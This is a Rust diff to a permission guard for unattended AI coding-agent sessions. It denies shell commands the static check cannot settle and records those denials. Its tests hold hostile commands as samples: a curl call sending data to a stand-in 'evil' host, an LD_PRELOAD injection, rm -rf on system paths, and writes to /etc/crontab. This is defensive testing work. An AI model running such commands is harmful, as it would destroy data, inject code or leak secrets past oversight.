@@ -91,6 +91,19 @@ pub const UNATTENDED_ALLOW_GRANTED_REASON: &str =
 pub const UNATTENDED_DENY_CATASTROPHIC_REASON: &str =
     "Auto-denied: catastrophic operation, never permitted unattended";
 
+/// Reason on an unattended auto-DENY of a [`RequestVerdict::Unclassified`]
+/// request. Names what the guard refused so the run is diagnosable from the
+/// agent's own failure report, and says how to get the work done anyway.
+pub const UNATTENDED_DENY_UNCLASSIFIED_REASON: &str =
+    "Auto-denied: this coding-agent session runs unattended, and the command guard's static pass \
+     refused to settle this request as safe. It refuses a command whose head is not what runs, \
+     or not all of it: command substitution, a code-injecting VAR=value preamble, a \
+     path-qualified command head (./x, bin/x), a redirect or a write outside the workspace, an \
+     executable git config or git output flag, and a payload it could not read. Retry with a \
+     shape the guard can read: a bare command head, no substitution, and any output kept inside \
+     the workspace. To read a file outside the workspace use cat, head or grep, which stay on \
+     the safe fast path.";
+
 /// Grouping key for collapsing identical concurrent permission requests. The
 /// canonical input is the serialized `input`, which suffices because the agent
 /// re-serializes the same struct each time and produces the same bytes.
@@ -566,7 +579,12 @@ pub async fn resolve_attend_mode(
                     _ => AttendMode::Unattended { grant: Vec::new() },
                 };
             }
-            MessageOrigin::System => return AttendMode::Unattended { grant: Vec::new() },
+            // A webhook is an external caller, so it lends no grant at all. A
+            // trigger that fires on the event it emitted carries its OWN grant,
+            // and arrives here as `Engine { Scheduler }` rather than this.
+            MessageOrigin::Webhook { .. } | MessageOrigin::System => {
+                return AttendMode::Unattended { grant: Vec::new() }
+            }
         }
     }
     // Depth or cycle exceeded. A chain this deep is automated, so never hang.
@@ -586,15 +604,51 @@ pub enum RequestVerdict {
     /// An irreversible real-world side-effect of this category — allow only when
     /// the trigger's grant contains it.
     SideEffect(SideEffectCategory),
+    /// The static pass REFUSED to settle this request rather than merely not
+    /// recognising it. `command_guard::FastPathDecline::Refusal` owns the full
+    /// list; a payload that could not be read joins it here.
+    ///
+    /// Denied unattended, whatever the grant. Nobody is watching, which is the
+    /// strongest reason to refuse a shape the guard cannot see through, not a
+    /// reason to run it. A merely UNRECOGNISED head (`cargo build`) is still
+    /// [`RequestVerdict::Benign`], because a missing allowlist entry costs
+    /// latency rather than safety.
+    ///
+    /// The refusal set reaches further than an attack shape, and that cost is
+    /// accepted rather than overlooked: a `/tmp` log redirect, a
+    /// `./scripts/x.sh` head, and `sort /etc/passwd` are all refusals, so an
+    /// unattended session is denied them and retries per
+    /// [`UNATTENDED_DENY_UNCLASSIFIED_REASON`]. A deny costs one request, not
+    /// the run (ADR 0002).
+    Unclassified,
 }
 
-/// Extract the shell command from a coding-agent *command* request. Codex raises
-/// these as `command_execution`; Claude Code as `Bash`.
-fn coding_agent_command<'a>(tool_name: &str, input: &'a serde_json::Value) -> Option<&'a str> {
+/// What a coding-agent *command* request carries. Codex raises these as
+/// `command_execution`; Claude Code as `Bash`.
+///
+/// The three cases are not two. "Not a command request" and "a command request
+/// whose payload I could not read" used to collapse into one `None`. The
+/// caller then fell through to its benign default, and an unattended session
+/// auto-allowed a command it had never seen the text of.
+enum CommandPayload<'a> {
+    /// Not a command request at all.
+    NotACommand,
+    /// The command text.
+    Known(&'a str),
+    /// A command request whose `command` field is missing, not a string, or
+    /// empty. Nothing can be classified, so it is denied unattended.
+    Unresolved,
+}
+
+/// Read the shell command out of a coding-agent *command* request.
+fn coding_agent_command<'a>(tool_name: &str, input: &'a serde_json::Value) -> CommandPayload<'a> {
     if !matches!(tool_name, "command_execution" | "Bash") {
-        return None;
+        return CommandPayload::NotACommand;
     }
-    input.get("command").and_then(|v| v.as_str())
+    match input.get("command").and_then(|v| v.as_str()) {
+        Some(cmd) if !cmd.trim().is_empty() => CommandPayload::Known(cmd),
+        _ => CommandPayload::Unresolved,
+    }
 }
 
 /// Extract the target paths of a coding-agent *file-write* request. Claude Code
@@ -805,7 +859,9 @@ pub fn worktree_write_auto_allowed(
 ///   normalized onto its bash tool vocabulary. The deny-list, the allowlist and
 ///   the static fallback all apply, with no LLM judge. An in-workspace
 ///   destruction counts as benign here, because it is recoverable. An
-///   irreversible side-effect carries its category for the grant check.
+///   irreversible side-effect carries its category for the grant check. A
+///   shape the fast path REFUSED is [`RequestVerdict::Unclassified`], which
+///   denies; a merely unrecognised head still runs.
 /// * A file request is benign only when EVERY target is in-workspace. **Any**
 ///   target outside the workspace root makes the whole request out-of-workspace
 ///   destruction, which is grant-gated. A `file_change` whose targets are
@@ -817,26 +873,38 @@ pub fn classify_coding_agent_request(
     input: &serde_json::Value,
     workspace_path: &Path,
 ) -> RequestVerdict {
-    if let Some(cmd) = coding_agent_command(tool_name, input) {
-        // Codex wraps commands as `/bin/zsh -lc '<script>'`; classify the inner
-        // script so a wrapped side-effect isn't hidden behind the `zsh` head.
-        let synthetic = serde_json::json!({ "command": unwrap_shell_command(cmd) });
-        return match command_guard::static_classify(tn::RUN_BASH, &synthetic) {
-            StaticVerdict::Settled(RiskLane::Catastrophic) => RequestVerdict::Catastrophic,
-            // `static_classify` only ever settles Safe/Catastrophic; map the
-            // rest defensively to benign.
-            StaticVerdict::Settled(_) => RequestVerdict::Benign,
-            StaticVerdict::NeedsJudge(ji) => {
-                let judged = command_guard::fallback_classify(&ji);
-                match judged.lane {
-                    RiskLane::Catastrophic => RequestVerdict::Catastrophic,
-                    RiskLane::IrreversibleDanger => RequestVerdict::SideEffect(
-                        judged.category.unwrap_or(SideEffectCategory::Other),
-                    ),
-                    RiskLane::Safe | RiskLane::ReversibleDanger => RequestVerdict::Benign,
+    match coding_agent_command(tool_name, input) {
+        // A command we cannot read is the opposite of benign. The whole
+        // classification below reads the command text, so there is nothing
+        // left to decide on.
+        CommandPayload::Unresolved => return RequestVerdict::Unclassified,
+        CommandPayload::Known(cmd) => {
+            // Codex wraps commands as `/bin/zsh -lc '<script>'`; classify the
+            // inner script so a wrapped side-effect isn't hidden behind `zsh`.
+            let synthetic = serde_json::json!({ "command": unwrap_shell_command(cmd) });
+            return match command_guard::static_classify(tn::RUN_BASH, &synthetic) {
+                StaticVerdict::Settled(RiskLane::Catastrophic) => RequestVerdict::Catastrophic,
+                // `static_classify` only ever settles Safe/Catastrophic; map the
+                // rest defensively to benign.
+                StaticVerdict::Settled(_) => RequestVerdict::Benign,
+                StaticVerdict::NeedsJudge(ji) => {
+                    let judged = command_guard::fallback_classify(&ji);
+                    match judged.lane {
+                        RiskLane::Catastrophic => RequestVerdict::Catastrophic,
+                        // Ahead of the category arm on purpose. The fast path
+                        // refused this shape rather than just missing its
+                        // head. A category the fallback derived from the same
+                        // text is not something to check a grant against.
+                        _ if ji.fast_path_refused => RequestVerdict::Unclassified,
+                        RiskLane::IrreversibleDanger => RequestVerdict::SideEffect(
+                            judged.category.unwrap_or(SideEffectCategory::Other),
+                        ),
+                        RiskLane::Safe | RiskLane::ReversibleDanger => RequestVerdict::Benign,
+                    }
                 }
-            }
-        };
+            };
+        }
+        CommandPayload::NotACommand => {}
     }
     match coding_agent_file_targets(tool_name, input) {
         FileTargets::Known(targets) => {
@@ -861,12 +929,36 @@ pub fn classify_coding_agent_request(
     RequestVerdict::Benign
 }
 
+/// Whether this thread's session-allow set already covers the request.
+///
+/// A command tool takes the chat lane's rule through the one shared predicate,
+/// [`command_guard::grant_covers_command`]: EVERY segment head must be
+/// covered, and a code-injecting `VAR=value` preamble is refused outright.
+/// Matching a single derived pattern instead let `git status && rm -rf /` ride
+/// a grant naming only `git`. Every other tool matches its one derived pattern
+/// exactly, as before.
+fn session_allow_covers(
+    tool_name: &str,
+    input: &serde_json::Value,
+    allowed: impl Fn(&str) -> bool,
+) -> bool {
+    use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
+    if matches!(tool_name, "Bash" | "command_execution") {
+        let Some(command) = input.get("command").and_then(|v| v.as_str()) else {
+            return false;
+        };
+        return command_guard::grant_covers_command(tool_name, command, allowed);
+    }
+    derive_allow_pattern(tool_name, input, AllowScope::Session).is_some_and(|p| allowed(&p))
+}
+
 /// Resolve a permission request for an unattended session from its classified
 /// verdict and the inherited grant. Returns `(allowed, reason)`.
 fn decide_unattended(verdict: RequestVerdict, grant: &[SideEffectCategory]) -> (bool, String) {
     match verdict {
         RequestVerdict::Benign => (true, UNATTENDED_ALLOW_BENIGN_REASON.to_string()),
         RequestVerdict::Catastrophic => (false, UNATTENDED_DENY_CATASTROPHIC_REASON.to_string()),
+        RequestVerdict::Unclassified => (false, UNATTENDED_DENY_UNCLASSIFIED_REASON.to_string()),
         RequestVerdict::SideEffect(cat) => {
             if grant.contains(&cat) {
                 (true, UNATTENDED_ALLOW_GRANTED_REASON.to_string())
@@ -942,8 +1034,6 @@ pub async fn prompt_coding_agent_permission(
     worktree_path: Option<&Path>,
     request: CodingAgentPermissionInput,
 ) -> PermissionPromptOutcome {
-    use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
-
     let CodingAgentPermissionInput {
         thread_id,
         tool_use_id,
@@ -964,13 +1054,11 @@ pub async fn prompt_coding_agent_permission(
     // does not re-ask.
     hydrate_session_allows(pool, pending, thread_id).await;
 
-    let session_pattern = derive_allow_pattern(&tool_name, &input, AllowScope::Session);
-    let is_session_allowed = match session_pattern.as_deref() {
-        Some(p) => {
-            let pending = pending.lock().unwrap();
+    let is_session_allowed = {
+        let pending = pending.lock().unwrap();
+        session_allow_covers(&tool_name, &input, |p| {
             pending.matches_session_allow(thread_id, p)
-        }
-        None => false,
+        })
     };
     if is_session_allowed {
         return PermissionPromptOutcome {
@@ -981,9 +1069,10 @@ pub async fn prompt_coding_agent_permission(
 
     // An unattended session has no human to answer a card, so resolve it from
     // the inherited side-effect grant plus a static benign check. The session
-    // NEVER hangs. Like the fast path above, this emits no card events. An
-    // auto-allow surfaces as the normal tool call, and an auto-deny surfaces in
-    // the agent's own failure report.
+    // NEVER hangs, and nothing here waits. An auto-ALLOW emits no events, like
+    // the fast path above: it surfaces as the normal tool call. An auto-DENY
+    // records the pair (see `record_unattended_denial`), because the agent's
+    // own failure report is not something the user can read back later.
     if let AttendMode::Unattended { grant } =
         resolve_attend_mode(pool, trigger_configs, thread_id).await
     {
@@ -996,6 +1085,18 @@ pub async fn prompt_coding_agent_permission(
             if allowed { "allow" } else { "deny" },
             reason
         );
+        if !allowed {
+            record_unattended_denial(
+                pool,
+                event_bus,
+                thread_id,
+                &tool_use_id,
+                &tool_name,
+                &input,
+                &reason,
+            )
+            .await;
+        }
         return PermissionPromptOutcome {
             allowed,
             reason: Some(reason),
@@ -1050,6 +1151,69 @@ pub async fn prompt_coding_agent_permission(
     // factored into `outcome_from_permission_recv` so the three-way split is
     // unit-testable without a DB.
     outcome_from_permission_recv(rx.recv().await)
+}
+
+/// Record an unattended auto-DENY in the thread's timeline, as the ordinary
+/// request/resolved pair rather than a new event type.
+///
+/// The unattended lane emits nothing on an ALLOW, deliberately: there is no
+/// decision to show. A deny is different. The agent reports a failed step, and
+/// without this the user cannot see what the engine refused or why, so the run
+/// is undiagnosable. The two events are emitted back to back, so the card
+/// renders already answered and the thread is never left needing attention.
+///
+/// The command text is redacted for the event exactly as the interactive path
+/// redacts it: it is persisted AND fanned out over SSE.
+async fn record_unattended_denial(
+    pool: &sqlx::PgPool,
+    event_bus: &EventBus,
+    thread_id: Uuid,
+    tool_use_id: &str,
+    tool_name: &str,
+    input: &serde_json::Value,
+    reason: &str,
+) {
+    let request_id = Uuid::new_v4().to_string();
+    let mut event_input = input.clone();
+    crate::core::redact_postgres_secrets_in_json(&mut event_input);
+    let summary = build_permission_summary(tool_name, &event_input);
+    // No header-borne actor on either raise path, so recover the originating
+    // actor from the thread's last user message, as the card path does.
+    let meta = match lookup_thread_actor(pool, thread_id).await {
+        Some(a) => EventMeta::with_actor(Some(a)),
+        None => EventMeta::NONE,
+    };
+    event_bus
+        .emit_or_log(
+            BusEvent::Thread {
+                thread_id,
+                event: ThreadEvent::CodingAgentPermissionRequest {
+                    request_id: request_id.clone(),
+                    tool_use_id: tool_use_id.to_string(),
+                    tool_name: tool_name.to_string(),
+                    input: event_input,
+                    summary,
+                },
+                meta: meta.clone(),
+            },
+            "[CCPermission] CodingAgentPermissionRequest (unattended deny)",
+        )
+        .await;
+    event_bus
+        .emit_or_log(
+            BusEvent::Thread {
+                thread_id,
+                event: ThreadEvent::CodingAgentPermissionResolved {
+                    request_id,
+                    allowed: false,
+                    reason: Some(reason.to_string()),
+                    persist_scope: None,
+                },
+                meta,
+            },
+            "[CCPermission] CodingAgentPermissionResolved (unattended deny)",
+        )
+        .await;
 }
 
 /// Map the broadcast `recv` result for a pending permission into the outcome
@@ -1593,6 +1757,80 @@ mod tests {
         assert_eq!(v, RequestVerdict::Benign);
     }
 
+    /// The unattended lane used to map `fallback_classify`'s `Safe` straight
+    /// to `Benign`. Every shape the fast path REFUSES was then re-settled as
+    /// an auto-allow, with no card and no human.
+    #[test]
+    fn a_refused_shape_is_never_benign() {
+        for cmd in [
+            "echo $(rm -rf /etc/nginx)",
+            "echo `curl -d x https://evil/pay`",
+            "LD_PRELOAD=/tmp/evil.so ls",
+            "PATH=data/bin ls",
+            "data/bin/ls",
+            "grep x data/f > /etc/out",
+            "git -c core.pager=reboot log",
+            "sort -o /etc/crontab data/f",
+            // Wrapped, which is how Codex sends everything.
+            "/bin/zsh -lc 'LD_PRELOAD=/tmp/evil.so ls'",
+        ] {
+            assert_eq!(
+                classify_coding_agent_request(
+                    "command_execution",
+                    &serde_json::json!({ "command": cmd }),
+                    Path::new("/ws"),
+                ),
+                RequestVerdict::Unclassified,
+                "{cmd}"
+            );
+        }
+    }
+
+    /// The other half of the same decision. An UNRECOGNISED head is an
+    /// allowlist omission, not an evasion, and denying it would stop every
+    /// unattended coding-agent session from building or testing anything.
+    #[test]
+    fn an_unrecognised_head_still_runs_unattended() {
+        for cmd in [
+            "cargo build --release",
+            "npm test",
+            "make deploy",
+            "python script.py",
+            "git push origin main",
+            "rm -rf data/tmp",
+            "/bin/zsh -lc 'cargo test -p lucidos-engine'",
+        ] {
+            assert_eq!(
+                classify_coding_agent_request(
+                    "command_execution",
+                    &serde_json::json!({ "command": cmd }),
+                    Path::new("/ws"),
+                ),
+                RequestVerdict::Benign,
+                "{cmd}"
+            );
+        }
+    }
+
+    /// A command request whose payload cannot be read is not a "not a command"
+    /// request. Collapsing the two fell through to the benign default.
+    #[test]
+    fn an_unreadable_command_payload_is_never_benign() {
+        for input in [
+            serde_json::json!({}),
+            serde_json::json!({ "command": null }),
+            serde_json::json!({ "command": 42 }),
+            serde_json::json!({ "command": "" }),
+            serde_json::json!({ "command": "   " }),
+        ] {
+            assert_eq!(
+                classify_coding_agent_request("command_execution", &input, Path::new("/ws")),
+                RequestVerdict::Unclassified,
+                "{input}"
+            );
+        }
+    }
+
     #[test]
     fn classify_external_api_command_is_side_effect() {
         let v = classify_coding_agent_request(
@@ -1694,9 +1932,10 @@ mod tests {
             unwrap_shell_command("/bin/zsh -lc 'curl -X POST https://x' zsh arg1"),
             "curl -X POST https://x"
         );
-        // Unterminated quote: no matching close, so it is returned as-is rather
-        // than guessed at.
-        assert_eq!(unwrap_shell_command("bash -c 'rm -rf"), "'rm -rf");
+        // Unterminated quote: the word scanner reads to the end of input, so
+        // the scans see `rm` rather than the quoted token `'rm`. More
+        // scanning, never less.
+        assert_eq!(unwrap_shell_command("bash -c 'rm -rf"), "rm -rf");
         // Not a shell wrapper → unchanged (Claude Code's raw Bash command).
         assert_eq!(
             unwrap_shell_command("curl -X POST https://x"),
@@ -2218,6 +2457,56 @@ mod tests {
     }
 
     #[test]
+    fn decide_unclassified_denies_whatever_the_grant() {
+        for grant in [
+            &[][..],
+            &[SideEffectCategory::Other],
+            &[SideEffectCategory::ExternalApi, SideEffectCategory::Email],
+        ] {
+            let (allowed, reason) = decide_unattended(RequestVerdict::Unclassified, grant);
+            assert!(!allowed);
+            assert_eq!(reason, UNATTENDED_DENY_UNCLASSIFIED_REASON);
+        }
+    }
+
+    /// One session click must grant the command's own head, not the wrapper
+    /// Codex puts in front of every command it runs.
+    #[test]
+    fn a_codex_session_grant_covers_one_head_not_the_whole_thread() {
+        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
+        let req = |cmd: &str| serde_json::json!({ "command": cmd });
+        assert!(session_allow_covers(
+            "command_execution",
+            &req("/bin/zsh -lc 'git log --oneline'"),
+            granted(&["command_execution(git:*)"])
+        ));
+        // The click that granted `git` must not carry a later `rm`.
+        assert!(!session_allow_covers(
+            "command_execution",
+            &req("/bin/zsh -lc 'rm -rf /'"),
+            granted(&["command_execution(git:*)"])
+        ));
+        // Nor a compound whose trailing segment it never named.
+        assert!(!session_allow_covers(
+            "command_execution",
+            &req("/bin/zsh -lc 'git status && rm -rf /'"),
+            granted(&["command_execution(git:*)"])
+        ));
+        // A code-injecting preamble is refused on the grant lane too.
+        assert!(!session_allow_covers(
+            "Bash",
+            &req("LD_PRELOAD=/tmp/evil.so ls"),
+            granted(&["Bash(ls:*)"])
+        ));
+        // Non-command tools keep their exact single-pattern match.
+        assert!(session_allow_covers(
+            "Edit",
+            &serde_json::json!({ "file_path": "/tmp/foo.md" }),
+            granted(&["Edit(/tmp/foo.md)"])
+        ));
+    }
+
+    #[test]
     fn decide_catastrophic_denies_even_when_other_granted() {
         let (allowed, _) =
             decide_unattended(RequestVerdict::Catastrophic, &[SideEffectCategory::Other]);
@@ -2415,15 +2704,11 @@ mod tests {
         .expect("unattended resolve must not hang");
         assert!(outcome.allowed, "benign in-workspace write auto-allows");
 
-        let count: i64 = sqlx::query_scalar(
-            "SELECT COUNT(*) FROM events \
-             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
-        )
-        .bind(thread_id)
-        .fetch_one(&pool)
-        .await
-        .expect("count");
-        assert_eq!(count, 0, "unattended path must not render a card");
+        assert_eq!(
+            count_permission_events(&pool, thread_id).await,
+            (0, 0),
+            "an unattended ALLOW renders no card and records nothing"
+        );
 
         pool.close().await;
         teardown_test_db(&db_name).await;
@@ -2468,9 +2753,164 @@ mod tests {
         .await
         .expect("must not hang");
         assert!(!outcome.allowed, "ungranted external API auto-denies");
+        // The deny is recorded, so the run is diagnosable from the timeline.
+        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
 
         pool.close().await;
         teardown_test_db(&db_name).await;
+    }
+
+    /// The unattended amplification of the Safe fast path's refusals. A shape
+    /// the guard would not settle is denied here rather than run, and the deny
+    /// leaves a trace naming the command.
+    #[tokio::test]
+    async fn unattended_trigger_denies_a_refused_shape_and_records_it() {
+        use crate::test_support::{setup_test_db, teardown_test_db};
+        let (pool, db_name) = setup_test_db().await;
+        let (bus, _rx) = EventBus::new(pool.clone());
+        let pending = Arc::new(Mutex::new(PermissionState::default()));
+        let trigger_id = "trig-refused";
+        let thread_id = Uuid::new_v4();
+        seed_cc_thread(&bus, thread_id).await;
+        insert_origin_event(
+            &pool,
+            thread_id,
+            "TriggerStarted",
+            &scheduler_origin(trigger_id),
+        )
+        .await;
+        // Grants everything the category vocabulary can express, to pin that a
+        // refused shape is denied whatever the trigger allows.
+        let cfgs = trigger_configs_with(
+            trigger_id,
+            vec![
+                SideEffectCategory::Other,
+                SideEffectCategory::ExternalApi,
+                SideEffectCategory::OutOfWorkspaceDestruction,
+            ],
+        );
+
+        let outcome = tokio::time::timeout(
+            std::time::Duration::from_secs(5),
+            prompt_coding_agent_permission(
+                &pool,
+                &bus,
+                &pending,
+                &cfgs,
+                Path::new("/ws"),
+                None,
+                CodingAgentPermissionInput {
+                    thread_id,
+                    tool_use_id: "i".into(),
+                    tool_name: "command_execution".into(),
+                    input: serde_json::json!({
+                        "command": "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'"
+                    }),
+                },
+            ),
+        )
+        .await
+        .expect("must not hang");
+        assert!(!outcome.allowed, "a refused shape auto-denies");
+        assert_eq!(
+            outcome.reason.as_deref(),
+            Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
+        );
+        // Request AND resolution, so no card is left unanswered and the thread
+        // is not parked needing attention nobody can give it.
+        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
+        let status: String =
+            sqlx::query_scalar("SELECT status FROM thread_summaries WHERE thread_id = $1")
+                .bind(thread_id)
+                .fetch_one(&pool)
+                .await
+                .expect("status");
+        assert_ne!(
+            status,
+            crate::engine::thread_lifecycle::ThreadStatus::WaitingForUserAnswer.as_str(),
+            "an engine-answered request must not park the thread"
+        );
+
+        pool.close().await;
+        teardown_test_db(&db_name).await;
+    }
+
+    /// The recorded request is persisted AND fanned out over SSE, so it takes
+    /// the same scrub the interactive path applies.
+    #[tokio::test]
+    async fn an_unattended_deny_redacts_the_command_it_records() {
+        use crate::test_support::{setup_test_db, teardown_test_db};
+        let (pool, db_name) = setup_test_db().await;
+        let (bus, _rx) = EventBus::new(pool.clone());
+        let pending = Arc::new(Mutex::new(PermissionState::default()));
+        let trigger_id = "trig-redact";
+        let thread_id = Uuid::new_v4();
+        seed_cc_thread(&bus, thread_id).await;
+        insert_origin_event(
+            &pool,
+            thread_id,
+            "TriggerStarted",
+            &scheduler_origin(trigger_id),
+        )
+        .await;
+        let cfgs = trigger_configs_with(trigger_id, vec![]);
+        let secret = "postgres://u:hunter2@localhost:5432/db";
+
+        tokio::time::timeout(
+            std::time::Duration::from_secs(5),
+            prompt_coding_agent_permission(
+                &pool,
+                &bus,
+                &pending,
+                &cfgs,
+                Path::new("/ws"),
+                None,
+                CodingAgentPermissionInput {
+                    thread_id,
+                    tool_use_id: "i".into(),
+                    tool_name: "command_execution".into(),
+                    input: serde_json::json!({
+                        "command": format!("psql {secret} -c 'select 1' && echo $(rm -rf ~)")
+                    }),
+                },
+            ),
+        )
+        .await
+        .expect("must not hang");
+
+        let payload: serde_json::Value = sqlx::query_scalar(
+            "SELECT payload FROM events \
+             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
+        )
+        .bind(thread_id)
+        .fetch_one(&pool)
+        .await
+        .expect("recorded request");
+        assert!(
+            !payload.to_string().contains("hunter2"),
+            "the recorded command must be scrubbed: {payload}"
+        );
+
+        pool.close().await;
+        teardown_test_db(&db_name).await;
+    }
+
+    /// `(requests, resolutions)` recorded on `thread_id`.
+    async fn count_permission_events(pool: &sqlx::PgPool, thread_id: Uuid) -> (i64, i64) {
+        let one = |event_type: &'static str| async move {
+            sqlx::query_scalar::<_, i64>(
+                "SELECT COUNT(*) FROM events WHERE thread_id = $1 AND event_type = $2",
+            )
+            .bind(thread_id)
+            .bind(event_type)
+            .fetch_one(pool)
+            .await
+            .expect("count")
+        };
+        (
+            one("CodingAgentPermissionRequest").await,
+            one("CodingAgentPermissionResolved").await,
+        )
     }
 
     #[tokio::test]
